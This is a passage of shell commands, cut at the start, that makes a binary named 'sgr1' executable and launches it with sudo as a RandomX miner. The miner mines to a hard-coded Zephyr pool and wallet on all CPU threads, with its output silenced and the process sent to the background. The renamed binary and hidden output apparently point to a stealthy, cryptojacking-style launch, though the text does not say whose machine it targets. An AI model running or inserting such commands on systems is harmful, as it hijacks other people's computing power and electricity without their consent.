...
chmod +x sgr1
sudo ./sgr1 --algorithm randomx --pool de.zephyr.herominers.com:1123 --wallet ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59 --password $(echo $(shuf -i 1-100000 -n 1)-A) --cpu-threads $(nproc --all) > /dev/null 2>&1 &
